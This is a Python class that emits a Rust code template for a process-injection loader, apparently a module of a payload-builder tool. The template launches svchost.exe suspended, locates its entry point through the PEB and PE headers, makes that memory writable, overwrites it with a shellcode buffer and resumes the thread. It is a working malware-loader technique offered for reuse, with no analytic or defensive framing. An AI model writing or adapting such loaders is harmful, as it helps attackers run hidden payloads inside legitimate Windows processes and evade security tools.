class processstomp:

    def imports(self) -> list[str]:
        return ['extern crate windows_sys;', 
                'use windows_sys::Win32::System::Memory::VirtualProtectEx;'
                'use windows_sys::Win32::System::Memory::PAGE_PROTECTION_FLAGS;'
                'use windows_sys::Win32::System::Diagnostics::Debug::ReadProcessMemory;'
                'use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;'
                'use windows_sys::Win32::System::Threading::CreateProcessA;'
                'use windows_sys::Win32::System::Threading::ResumeThread;'
                'use windows_sys::Win32::System::Threading::STARTUPINFOA;'
                'use windows_sys::Win32::System::Threading::PROCESS_INFORMATION;'
                'use windows_sys::Win32::System::Threading::PROCESS_BASIC_INFORMATION;'
                'use windows_sys::Wdk::System::Threading::NtQueryInformationProcess;'
                'use windows_sys::Win32::System::Threading::CREATE_SUSPENDED;'
                'use windows_sys::Win32::System::Memory::PAGE_EXECUTE_READWRITE;'
                'use std::ffi::CString;'
                'use core::ffi::c_void;'
                'use std::mem::size_of;'
                'use std::ptr;'
                ]

    def compilerOptions(self) -> list[str]:
        return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Kernel", "Wdk_System", "Wdk_System_Threading"] }']

    def template(self) -> str:
        return """
{imports}

{codeblocks}


fn main() {{

    
    {transformers}

    unsafe
    {{

        let name = CString::new("C:\\\\Windows\\\\System32\\\\svchost.exe").unwrap();

        let lpstartupinfo = STARTUPINFOA {{
            cb: std::mem::size_of::<STARTUPINFOA>() as u32,
            ..Default::default()
        }};
        let mut lpprocessinformation = PROCESS_INFORMATION::default();


        let _ = CreateProcessA(
            ptr::null_mut(),
            name.as_ptr() as *mut u8, 
            ptr::null_mut(), 
            ptr::null_mut(), 
            0, 
            CREATE_SUSPENDED, 
            ptr::null_mut(), 
            ptr::null_mut(), 
            &lpstartupinfo as *const STARTUPINFOA, 
            &mut lpprocessinformation as *mut PROCESS_INFORMATION,
            );
        
        let processinformation: *mut c_void = std::mem::transmute(&PROCESS_BASIC_INFORMATION::default());

        let mut return_length: u32 = 0;

        let _err = NtQueryInformationProcess(
            (lpprocessinformation).hProcess, 
            0, 
            processinformation, 
            size_of::<PROCESS_BASIC_INFORMATION>() as u32, 
            &mut return_length);
        
        let process_information_ptr: *mut PROCESS_BASIC_INFORMATION = std::mem::transmute(processinformation);


        let ptr_to_image_base:*mut i64 = ((*process_information_ptr).PebBaseAddress as i64 + 0x10) as *mut i64;
        let lpbaseaddress: *const c_void = std::mem::transmute(ptr_to_image_base);
        let buffer: [u8; 8] = [0; 8];
        let lpbuffer: *mut c_void = std::mem::transmute(&buffer);

        let _ = ReadProcessMemory(
            (lpprocessinformation).hProcess, 
            lpbaseaddress, 
            lpbuffer, 
            buffer.len(), 
            ptr::null_mut());
        
        let svchost:*mut i64 =  std::mem::transmute(lpbuffer);   
        let svchost_base: *mut i64 = (*svchost) as *mut i64;
        
        let lpbaseaddress: *const c_void = std::mem::transmute(svchost_base);
        let buffer: [u8; 300] = [0; 300]; // Con 200 bytes no es suficiente
        let lpbuffer: *mut c_void = std::mem::transmute(&buffer);
        
        let _ = ReadProcessMemory(
            (lpprocessinformation).hProcess, 
            lpbaseaddress, 
            lpbuffer, 
            buffer.len(), 
            ptr::null_mut());

        let svchost_base_address:*mut i64 =  std::mem::transmute(lpbuffer);  
        let e_lfanew_offset = *((svchost_base_address as i64 + 0x3C) as *mut i32);
        let opthdr: i64 = e_lfanew_offset as i64 + 0x28 as i64;
        let entrypoint_rva: u32 = *((svchost_base_address as i64 + opthdr as i64) as *mut u32);
        let entrypoint_address: *mut u32 = (entrypoint_rva as i64 + svchost_base as i64) as *mut u32;

        let lpbaseaddress: *mut c_void = std::mem::transmute(entrypoint_address);
        let lpbuffer: *mut c_void = std::mem::transmute(shellcode.as_ptr());
        let lpfloldprotect: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());

        let _ = VirtualProtectEx(
            (lpprocessinformation).hProcess, 
            lpbaseaddress, 
            shellcode.len() as usize, 
            PAGE_EXECUTE_READWRITE, 
            lpfloldprotect);

        let _ = WriteProcessMemory(
            (lpprocessinformation).hProcess, 
            lpbaseaddress, 
            lpbuffer, 
            shellcode.len() as usize, 
            ptr::null_mut());

        
        let tmp: *mut PAGE_PROTECTION_FLAGS = std::mem::transmute(&PAGE_PROTECTION_FLAGS::default());

        let _ = VirtualProtectEx(
            (lpprocessinformation).hProcess, 
            lpbaseaddress, 
            shellcode.len() as usize, 
            *lpfloldprotect, 
            tmp);
        
        ResumeThread((lpprocessinformation).hThread);
    
    }}
    
}}
"""